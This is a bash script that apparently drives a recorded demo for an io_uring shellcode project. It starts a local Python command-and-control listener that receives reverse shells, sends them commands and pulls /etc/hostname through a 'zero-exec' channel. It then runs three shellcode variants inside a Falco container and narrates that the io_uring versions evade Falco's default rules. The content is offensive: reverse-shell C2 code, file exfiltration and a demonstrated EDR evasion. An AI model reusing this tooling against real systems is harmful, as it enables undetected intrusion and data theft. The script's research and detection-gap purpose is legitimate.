#!/usr/bin/env bash
# falco_demo.sh — recorded EDR-contrast demo driver (asciinema + tmux)
#
# Plays BOTH execution scenarios on a scripted tmux layout while the live
# falco log streams in real time:
#
#   ┌──────────────────────────┬───────────────────────────────────┐
#   │ target execution         │ falco live stream                 │
#   │ (docker exec of the      │ (docker logs -f, stock/default    │
#   │  shellcode)              │  ruleset, filtered to "Notice ")  │
#   ├──────────────────────────┤                                   │
#   │ host C2 output           │                                   │
#   └──────────────────────────┴───────────────────────────────────┘
#
# Scenarios (each run inside the falco container, stock rules only):
#   1. cbsys.bin     — pure-syscall baseline  → 3 stock-rule rows
#   2. cb_uring.bin  — io_uring classic       → 0 rows
#   3. cbr_uring.bin — io_uring zero-exec     → 0 rows (exfil still lands)
#
# Usage:
#   uvx asciinema rec --overwrite --cols 190 --rows 40 \
#     -c "bash testing/falco_demo.sh" testing/results/falco_demo.cast
#   uvx asciinema play testing/results/falco_demo.cast
#
# Notes
# - Uses a DEDICATED tmux socket (demo-sock) so the user's own tmux
#   sessions (and their group semantics) can never interfere.
# - PATH is sanitized: when run under `uvx`, `python3` would resolve to
#   uv's CPython (no pyyaml) and uring_builder would crash — force the
#   system toolchain instead.
set -u
ROOT=$(CDPATH= cd -- "$(dirname -- "$0")/.." && pwd)
POC=/tmp/poc
SESS=demo
SOCK=demo-sock
C2LOG="$POC/demo_c2.log"

export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

C2PID=""
cleanup() {
    [ -n "$C2PID" ] && kill "$C2PID" 2>/dev/null
    docker rm -f flk >/dev/null 2>&1
    tmux -L "$SOCK" kill-server >/dev/null 2>&1
    true
}
trap cleanup EXIT

# ── 0. pre-flight (not recorded — runs before tmux attach) ────────────
mkdir -p "$POC"
: > "$C2LOG"
docker rm -f flk >/dev/null 2>&1
pkill -f "c2_server.py"     2>/dev/null
pkill -f "recv_client_test" 2>/dev/null
sleep 1

# C2 orchestrator: serves 2 classic reverse shells, then the zero-exec
# file pull; all its output goes into the C2 tail pane.
python3 >"$C2LOG" 2>&1 <<'PYEOF' &
import socket, time
s = socket.socket()
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind(('127.0.0.1', 4444)); s.listen(1)
for i in range(2):
    c, a = s.accept()
    print(f'[C2] connect-back #{i+1} from {a} — shell alive', flush=True)
    time.sleep(0.8)
    c.sendall(b'id; echo DEMO_OK\n')
    c.settimeout(4)
    out = b''
    try:
        while True:
            d = c.recv(4096)
            if not d:
                break
            out += d
    except socket.timeout:
        pass
    dec = out.decode(errors='replace')
    print(f'[C2] {len(out)} bytes read; DEMO_OK present: {"DEMO_OK" in dec}', flush=True)
    for ln in dec.strip().splitlines()[:3]:
        print(f'[C2]     | {ln}', flush=True)
    c.close()
c, a = s.accept()
print(f'[C2] zero-exec connect from {a}', flush=True)
c.sendall(b'/etc/hostname\n')
c.settimeout(5)
out = b''
try:
    while True:
        d = c.recv(4096)
        if not d:
            break
        out += d
except socket.timeout:
    pass
print(f'[C2] exfil received: {len(out)} bytes | "{out.decode(errors="replace").strip()}", ...', flush=True)
print('[C2] (socket closed → shellcode exited cleanly)', flush=True)
PYEOF
C2PID=$!

# blobs + static runner (real builds; shown again on screen for narrative)
nasm -f bin -o "$POC/cbsys.bin" "$ROOT/shellcode/connect_back_sys.asm"
python3 "$ROOT/builder/uring_builder.py" "$ROOT/builder/missions/connect_back.yaml" \
    --out "$POC/cb_uring.bin" --quiet
python3 "$ROOT/builder/uring_builder.py" "$ROOT/builder/missions/connect_back_recv.yaml" \
    --out "$POC/cbr_uring.bin" --quiet
gcc -O0 -static -o "$POC/runner" "$ROOT/testing/runner.c"

# ── 1. tmux layout (dedicated socket) ─────────────────────────────────
tm() { tmux -L "$SOCK" "$@"; }
tm kill-server >/dev/null 2>&1
tm start-server
# use REAL ids from the start: the user's tmux server may use base-index 1
# (making numeric `$SESS:0` non-existent) — session/pane ids are stable.
# Size splits with FIXED cell lengths (-l): percentage splits (-p) need a
# client/terminal reference and fail on a detached session ("size missing").
SID=$(tm new-session -d -x 190 -y 40 -s "$SESS" -n main -P -F '#{session_id}')
CMD=$(tm list-panes -t "$SID" -F '#{pane_id}')
STR=$(tm split-window -h -l 88 -t "$CMD" -P -F '#{pane_id}')    # right, full height
C2P=$(tm split-window -v -l 10 -t "$CMD" -P -F '#{pane_id}')    # left, bottom strip
tm set -w pane-border-status top
tm set -w pane-border-format ' ─ #{pane_title} ─'
tm select-pane -t "$CMD" -T 'target execution (docker exec)'
tm select-pane -t "$C2P" -T 'host C2 (127.0.0.1:4444)'
tm select-pane -t "$STR" -T 'falco live (docker logs -f | default ruleset)'

for P in "$CMD" "$C2P" "$STR"; do
    tm send-keys -t "$P" -l "cd $ROOT && export PS1='\$ ' && clear"
    tm send-keys -t "$P" Enter
    sleep 0.2
done
tm send-keys -t "$C2P" -l "tail -f $C2LOG"
tm send-keys -t "$C2P" Enter

type() {  # type text into CMD CHARACTER BY CHARACTER (visible typing), then Enter
    local s="$1" c
    for ((i=0; i<${#s}; i++)); do
        c="${s:$i:1}"
        tm send-keys -t "$CMD" -l "$c"
        sleep 0.02
    done
    sleep 0.25
    tm send-keys -t "$CMD" Enter;   sleep "${3:-2.5}"
}
narr() {  # colored screen narration; args: colorcode text [pause]
    tm send-keys -t "$CMD" -l "printf '\\033[${1}m${2}\\033[0m\\n'"
    tm send-keys -t "$CMD" Enter; sleep "${3:-2.0}"
}

# ════════════════════════ demo flow (background driver) ════════════════════════
(
    sleep 0.8
    tm send-keys -t "$CMD" -l "printf '\\033[36;1m uring-shellcode — EDR-visibility demo (falco 0.45.1, default rules only)\\033[0m\\n'"
    tm send-keys -t "$CMD" Enter
    narr "36" "  left: commands  |  right: live falco  |  bottom-left: host C2 output" 1.6

    cd "$POC"
    narr "33" "  ── setup: launch falco privileged container, NO custom ruleset ──" 0.5
    type "docker run -d --name flk --privileged --network host -e HOST_ROOT=/host -v /tmp/poc:/lab:ro -v /proc:/host/proc:ro -v /sys:/host/sys:ro -v /etc:/host/etc:ro falcosecurity/falco:0.45.1-debian falco -c /etc/falco/falco.yaml -o webserver.enabled=false" 0.8 5
    narr "0" "  (waiting for the BPF probe to attach…)" 0.6
    sleep 14
    narr "0" "  probe attached. nothing suspicious has happened yet — right pane silent." 0.8

    # start the live stream now that the container exists; rows begin with a
    # 36-char ISO timestamp — cut at "Notice" and keep within the 87-col pane
    tm send-keys -t "$STR" -l "docker logs -f flk 2>&1 | stdbuf -oL grep --line-buffered 'Notice ' | stdbuf -oL cut -c37-123"
    tm send-keys -t "$STR" Enter
    sleep 2

    narr "36" "══ SCENARIO 1 — pure-syscall baseline (cbsys.bin): socket → connect → dup2×3 → execve ══" 0.8
    type "docker exec flk /lab/runner /lab/cbsys.bin" 0.8 8
    type 'printf "     stock-rule rows: %s\n" "$(docker logs flk 2>&1 | grep -c "Notice Redirect")"' 0.3 1.8
    narr "32" "  ✔ DETECTED out of the box — 3 rows, one per dup2 of the connected socket; zero tuning" 1.4

    narr "36" "══ SCENARIO 2 — io_uring classic (cb_uring.bin): socket/connect via io_uring_enter ══" 0.8
    type "docker exec flk /lab/runner /lab/cb_uring.bin" 0.8 8
    type 'printf "     stock-rule rows: %s  ← unchanged, no new rows\n" "$(docker logs flk 2>&1 | grep -c "Notice Redirect")"' 0.3 1.8
    narr "31" "  ✘ NOT detected — socket/connect invisible; dup2 runs but its fd was born in io_uring" 1.0
    narr "31" "    → no fd↔socket binding for falco → the stock rule stays silent (C2 got a full shell anyway)" 1.4

    narr "36" "══ SCENARIO 3 — zero-exec (cbr_uring.bin): recv-driven exfil, no exec at all ══" 0.8
    type "docker exec flk /lab/runner /lab/cbr_uring.bin" 0.8 8
    type 'printf "     stock-rule rows: %s  ← still nothing\n" "$(docker logs flk 2>&1 | grep -c "Notice Redirect")"' 0.3 1.8
    narr "31" "  ✘ NOT detected — and /etc/hostname landed at the C2 (bottom-left); clean exit" 1.4
    sleep 1
    narr "36" "  TOTAL: the only rule-firings in the whole session were the 3 dup2 rows of the baseline." 1.4
    narr "36" "  every io_uring interaction surfaces as io_uring_setup/io_uring_enter — no sys_enter events." 1.6
    sleep 2.5
    tm kill-session -t "$SID"
) &

# attach in the foreground; when the flow kills the session, attach
# returns and the EXIT trap does the cleanup (then rec finalizes)
tm attach -t "$SID"
echo demo-finished
